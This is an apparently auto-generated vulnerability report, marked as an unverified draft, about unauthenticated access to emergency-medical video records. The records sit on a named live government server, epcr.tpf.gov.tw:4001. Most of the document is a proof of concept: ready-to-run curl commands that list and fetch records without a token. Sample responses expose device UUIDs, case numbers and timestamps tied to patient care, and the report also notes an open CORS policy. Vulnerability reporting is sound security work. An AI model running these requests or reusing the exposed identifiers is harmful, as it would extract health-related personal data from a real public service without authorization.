# POC/EXP — 4001 VitalSignVideoServer /videoData 未授权读取急救影音记录（含设备/案件 UUID）

> 漏洞ID: `c11a8e11-0657-44bc-88e3-822d567e20e3`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/videoData`

**類型**: 未授权访问/敏感资料外泄

## 描述

4001 VitalSignVideoServer（https://epcr.tpf.gov.tw:4001）的 REST 资源 /videoData 完全未启用认证：GET /videoData 可分页列出全部急救影音记录（每页100条，含 recordUuid/fileName/fileId/mimeType/VideoType），GET /videoData/{id} 可按主键读取单条，且返回的 fileName 暴露 iPhone 设备 UUID（如 tw.com.viewlead.emtapp9C372D5A-7431-471E-8135-A1163FC6A7BE）与急救案件 UUID（如 180810145678）、时间戳。recordUuid 形似急救派遣案件编号，属于 EMS/患者相关影音资料，属个人/健康资讯范畴。该服务同时开启 socket.io 且 Access-Control-Allow-Origin: *。

## POC / 復現步驟

```
# 列出（无需 token）
curl -sS -k "https://epcr.tpf.gov.tw:4001/videoData?limit=2"
# → HTTP 200, JSON 数组, 每页100条
# sample: {"id":2,"recordUuid":"180810145678","fileName":"[iPhone][tw.com.viewlead.emtapp9C372D5A-7431-471E-8135-A1163FC6A7BE][180810145678][20180814162050].mp4","fileId":107,"mimeType":"video/mp4","generatedAt":"2018-08-14T08:20:50.000Z",...,"VideoType":{"id":1,"name":"手機上傳",...}}
# 按主键读取单条（无需 token）
curl -sS -k "https://epcr.tpf.gov.tw:4001/videoData/107"
# → HTTP 200, {"id":107,"recordUuid":"Test18081618453882","fileName":"HeadCam_...","mimeType":...}
# 对照：4000/4004 等服务的同类端点均需 Bearer token（401 "No authorization token was found"）。
# socket.io CORS: GET /socket.io/ → Access-Control-Allow-Origin: *
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
